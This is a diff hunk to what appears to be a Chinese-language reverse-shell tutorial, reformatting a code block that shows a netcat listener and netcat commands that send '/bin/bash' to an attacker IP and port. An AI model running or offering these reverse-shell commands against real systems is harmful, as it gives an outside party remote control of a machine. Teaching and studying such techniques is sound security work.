@@ -40,7 +40,8 @@ nc -lvvp 2333
 ```
 **目标机主动连接攻击机：**
 ```
-netcat 47.xxx.xxx.72 2333 -e /bin/bash# nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
+netcat 47.xxx.xxx.72 2333 -e /bin/bash
+nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
 ```
 
 ## **0x03.利用Bash反弹shell**
